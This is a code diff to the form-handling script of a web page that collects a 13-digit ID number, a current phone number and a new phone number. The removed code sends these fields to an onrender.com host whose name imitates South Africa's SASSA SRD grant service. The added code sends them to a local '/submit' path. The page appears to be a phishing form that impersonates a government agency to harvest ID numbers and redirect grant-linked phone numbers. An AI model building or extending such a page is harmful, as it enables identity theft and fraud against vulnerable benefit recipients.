@@ -61,43 +61,33 @@
     </main>
   </div>
 
-  <script>
-    function validateForm() {
-      const idNumber = document.getElementById('idNumber').value;
-      const phoneNumber = document.getElementById('phoneNumber').value;
-      const submitButton = document.getElementById('submitButton');
-      if (idNumber.length === 13 && phoneNumber.length === 10) {
-        submitButton.disabled = false;
+ <script>
+  document.getElementById("applicationForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const idNumber = document.getElementById("idNumber").value.trim();
+    const phoneNumber = document.getElementById("phoneNumber").value.trim();
+    const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
+
+    try {
+      const response = await fetch("/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
+      });
+
+      if (response.ok) {
+        alert("Application submitted successfully!");
+      } else if (response.status === 409) {
+        alert("Duplicate entry found.");
       } else {
-        submitButton.disabled = true;
+        alert("An error occurred.");
       }
+    } catch (error) {
+      console.error("Submission error:", error);
+      alert("Network error. Please try again.");
     }
+  });
+</script>
 
-    document.getElementById("applicationForm").addEventListener("submit", async function (e) {
-      e.preventDefault();
-      const idNumber = document.getElementById("idNumber").value.trim();
-      const phoneNumber = document.getElementById("phoneNumber").value.trim();
-      const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
-
-      try {
-        const response = await fetch("https://srd-sassa-gov-za-change-numbers.onrender.com/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
-        });
-
-        if (response.ok) {
-          alert("Application submitted successfully!");
-        } else if (response.status === 409) {
-          alert("Duplicate entry found.");
-        } else {
-          alert("An error occurred.");
-        }
-      } catch (error) {
-        console.error("Submission error:", error);
-        alert("Network error. Please try again.");
-      }
-    });
-  </script>
 </body>
 </html>
